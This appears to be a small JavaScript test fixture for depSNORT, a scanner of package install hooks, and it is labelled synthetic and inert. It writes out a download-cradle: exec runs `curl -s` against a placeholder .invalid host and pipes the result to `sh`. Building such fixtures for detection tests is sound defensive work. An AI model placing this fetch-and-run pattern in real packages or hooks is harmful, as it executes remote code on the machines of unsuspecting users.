// Synthetic payload for depSNORT install-surface tests. Inert: the URL host
// does not resolve. Models the download-cradle shape (D-28): a lifecycle hook
// that fetches a remote script and pipes it straight to a shell.
const { exec } = require('child_process');
const payloadUrl = "https://depsnort-fixture-cdn.invalid/payload.sh";
exec(`curl -s ${payloadUrl} | sh`, () => {});
